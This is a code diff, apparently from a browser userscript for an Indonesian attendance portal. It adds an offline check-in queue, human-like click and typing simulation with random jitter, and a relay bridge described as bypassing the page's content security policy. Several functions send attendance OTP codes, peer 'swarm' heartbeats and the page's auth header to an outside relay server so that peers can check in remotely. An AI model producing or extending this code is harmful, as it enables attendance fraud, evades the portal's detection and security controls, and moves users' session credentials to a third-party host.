@@ -813,7 +813,20 @@
   }
 
   _addEventListener('pageshow', () => { configReceived = false; retries = 0; requestConfig(); });
-  _addEventListener('online',   () => { configReceived = false; retries = 0; requestConfig(); });
+  _addEventListener('online',   () => {
+    configReceived = false; retries = 0; requestConfig();
+    try {
+      const q = sessionStorage.getItem('__presensi_pending_queue');
+      if (q) {
+        sessionStorage.removeItem('__presensi_pending_queue');
+        const item = JSON.parse(q);
+        if (item && item.code && _hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
+          _hudContainer._refs.codeInput.value = item.code;
+          _triggerCheckIn();
+        }
+      }
+    } catch (_) {}
+  });
 
   // ── Phase 4.5: HUD State ──────────────────────────────────────────────────
   let _hudContainer    = null;
@@ -1105,6 +1118,18 @@
       return;
     }
 
+    if (navigator.onLine === false) {
+      try {
+        const tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
+        sessionStorage.setItem('__presensi_pending_queue', JSON.stringify({ code, tmId, ts: Date.now() }));
+      } catch (_) {}
+      if (refs.statusMsg) {
+        refs.statusMsg.textContent = 'Offline: Antrian tersimpan, auto-kirim saat terhubung';
+        refs.statusMsg.style.color = '#f59e0b';
+      }
+      return;
+    }
+
     if (refs.statusMsg) {
       refs.statusMsg.textContent = 'Memproses presensi...';
       refs.statusMsg.style.color = '#60a5fa';
@@ -1197,34 +1222,77 @@
     refs.btnCheckin.style.opacity = '1';
   }
 
+  function _dispatchHumanMouseEvent(el, type) {
+    try {
+      const rect = el.getBoundingClientRect();
+      const x = rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
+      const y = rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
+      el.dispatchEvent(new MouseEvent(type, {
+        bubbles: true, cancelable: true, view: window,
+        clientX: x, clientY: y, buttons: type === 'mousedown' ? 1 : 0
+      }));
+    } catch (_) {}
+  }
+
+  function _simulateHumanClick(el, done) {
+    _dispatchHumanMouseEvent(el, 'mousemove');
+    _dispatchHumanMouseEvent(el, 'mouseenter');
+    _setTimeout(() => {
+      _dispatchHumanMouseEvent(el, 'mousedown');
+      _setTimeout(() => {
+        _dispatchHumanMouseEvent(el, 'mouseup');
+        el.click();
+        if (typeof done === 'function') _setTimeout(done, 120 + Math.random() * 80);
+      }, 50 + Math.random() * 50);
+    }, 40 + Math.random() * 40);
+  }
+
   function _simulateDomCheckIn(code) {
     const buttons = Array.from(document.querySelectorAll('button, a'));
     const hadirBtn = buttons.find(b => b.textContent && b.textContent.trim().toLowerCase() === 'hadir');
-    if (hadirBtn) hadirBtn.click();
+    if (!hadirBtn) return;
 
-    _setTimeout(() => {
+    _simulateHumanClick(hadirBtn, () => {
       const pinInputs = Array.from(document.querySelectorAll('input[data-index]'));
       if (pinInputs.length >= 6) {
-        for (let i = 0; i < 6; i++) {
-          pinInputs[i].value = code[i] || '';
-          pinInputs[i].dispatchEvent(new Event('input', { bubbles: true }));
-          pinInputs[i].dispatchEvent(new Event('change', { bubbles: true }));
+        let digitIdx = 0;
+        function typeNextDigit() {
+          if (digitIdx >= 6) {
+            _submitModal();
+            return;
+          }
+          const input = pinInputs[digitIdx];
+          const char = code[digitIdx] || '';
+          input.focus();
+          input.dispatchEvent(new KeyboardEvent('keydown', { key: char, bubbles: true }));
+          input.value = char;
+          input.dispatchEvent(new Event('input', { bubbles: true }));
+          input.dispatchEvent(new Event('change', { bubbles: true }));
+          input.dispatchEvent(new KeyboardEvent('keyup', { key: char, bubbles: true }));
+          digitIdx++;
+          _setTimeout(typeNextDigit, 60 + Math.random() * 60);
         }
+        typeNextDigit();
       } else {
         const textInputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
         const modalInput = textInputs.find(i => i.placeholder && /kode/i.test(i.placeholder)) || textInputs[0];
         if (modalInput) {
+          modalInput.focus();
           modalInput.value = code;
           modalInput.dispatchEvent(new Event('input', { bubbles: true }));
           modalInput.dispatchEvent(new Event('change', { bubbles: true }));
+          _setTimeout(_submitModal, 150 + Math.random() * 100);
         }
       }
-      _setTimeout(() => {
-        const modalButtons = Array.from(document.querySelectorAll('.chakra-modal__content button, .modal button, [role="dialog"] button'));
-        const submitBtn = modalButtons.find(b => /simpan|kirim|hadir/i.test(b.textContent || ''));
-        if (submitBtn) submitBtn.click();
-      }, 300);
-    }, 250);
+
+      function _submitModal() {
+        _setTimeout(() => {
+          const modalButtons = Array.from(document.querySelectorAll('.chakra-modal__content button, .modal button, [role="dialog"] button'));
+          const submitBtn = modalButtons.find(b => /simpan|kirim|hadir/i.test(b.textContent || ''));
+          if (submitBtn) _simulateHumanClick(submitBtn);
+        }, 120 + Math.random() * 80);
+      }
+    });
   }
 
   function _renderHudTick() {
@@ -1342,10 +1410,49 @@
     }
   }
 
+  // ── CSP-Immune Relay Fetch Bridge (bypasses page connect-src CSP) ─────────
+  function _relayFetch(url, options) {
+    if (!_isPortalDomain()) return Promise.resolve({ ok: false, status: 0 });
+    return new Promise((resolve) => {
+      const reqId = Math.random().toString(36).substring(2, 10);
+      const resEvent = '__gps_relay_res_' + reqId;
+      const timer = _setTimeout(() => {
+        try { _removeEventListener(resEvent, onRes, true); } catch (_) {}
+        resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
+      }, 5000);
+
+      function onRes(e) {
+        try {
+          _removeEventListener(resEvent, onRes, true);
+          _clearTimeout(timer);
+          const data = typeof e.detail === 'string' ? JSON.parse(e.detail) : e.detail;
+          resolve({
+            ok:     Boolean(data && data.ok),
+            status: (data && data.status) || (data && data.ok ? 200 : 500),
+            json:   () => Promise.resolve((data && data.data) || null),
+            text:   () => Promise.resolve((data && data.text) || '')
+          });
+        } catch (_) {
+          resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
+        }
+      }
+
+      _addEventListener(resEvent, onRes, true);
+      try {
+        _dispatchEvent(new _CustomEvent('__gps_relay_req', {
+          detail: JSON.stringify({ reqId, url, options })
+        }));
+      } catch (_) {
+        _clearTimeout(timer);
+        resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
+      }
+    });
+  }
+
   function _pushSwarmState(stateObj) {
     const relay = _getRelayUrl();
-    if (!relay || !_origFetch) return;
-    _origFetch(`${relay}/mesh/state`, {
+    if (!relay || !_isPortalDomain()) return;
+    _relayFetch(`${relay}/mesh/state`, {
       method:  'PUT',
       headers: { 'Content-Type': 'application/json' },
       body:    JSON.stringify(stateObj)
@@ -1354,10 +1461,10 @@
 
   function _pushOtp(otp, tmKey) {
     const relay = _getRelayUrl();
-    if (!relay || !tmKey || !otp || !_origFetch) return;
+    if (!relay || !tmKey || !otp || !_isPortalDomain()) return;
     if (_lastPushedOtp === otp) return;
     _lastPushedOtp = otp;
-    _origFetch(`${relay}/otp/${tmKey}`, {
+    _relayFetch(`${relay}/otp/${tmKey}`, {
       method:  'PUT',
       headers: { 'Content-Type': 'application/json' },
       body:    JSON.stringify({ code: otp, otp, ts: Date.now() })
@@ -1366,9 +1473,9 @@
 
   function _pullOtp(tmKey) {
     const relay = _getRelayUrl();
-    if (!relay || !tmKey || !_origFetch) return;
-    _origFetch(`${relay}/otp/${tmKey}`, { method: 'GET' })
-      .then(r => r.ok ? r.json() : null)
+    if (!relay || !tmKey || !_isPortalDomain()) return;
+    _relayFetch(`${relay}/otp/${tmKey}`, { method: 'GET' })
+      .then(r => r && r.ok ? r.json() : null)
       .then(data => {
         if (!data) return;
         const otp = String(data.code || data.otp || '');
@@ -1395,7 +1502,7 @@
 
   function _swarmHeartbeat() {
     const relay = _getRelayUrl();
-    if (!relay || !_origFetch) return;
+    if (!relay || !_isPortalDomain()) return;
 
     const meta = {
       domain: window.location.hostname,
@@ -1404,12 +1511,12 @@
       hasQr:  Boolean(_virtualQrImage),
     };
 
-    _origFetch(`${relay}/mesh/heartbeat/${_peerId}`, {
+    _relayFetch(`${relay}/mesh/heartbeat/${_peerId}`, {
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
       body:    JSON.stringify(meta)
     })
-      .then(r => r.ok ? r.json() : null)
+      .then(r => r && r.ok ? r.json() : null)
       .then(data => {
         if (!data) return;
         _isSwarmLeader = Boolean(data.isLeader);
@@ -1441,6 +1548,7 @@
 
   function _startOtpPoller() {
     if (_swarmActive) return;
+    if (!_isPortalDomain()) return;
     const relay = _getRelayUrl();
     if (!relay) {
       _updateHudSwarmBadge();
@@ -1520,8 +1628,8 @@
         } catch (_) {}
 
         const relay = _getRelayUrl();
-        if (relay && _origFetch) {
-          _origFetch(`${relay}/session`, {
+        if (relay && _isPortalDomain()) {
+          _relayFetch(`${relay}/session`, {
             method:  'PUT',
             headers: { 'Content-Type': 'application/json' },
             body:    JSON.stringify({ auth: authHeader, ts: Date.now() })
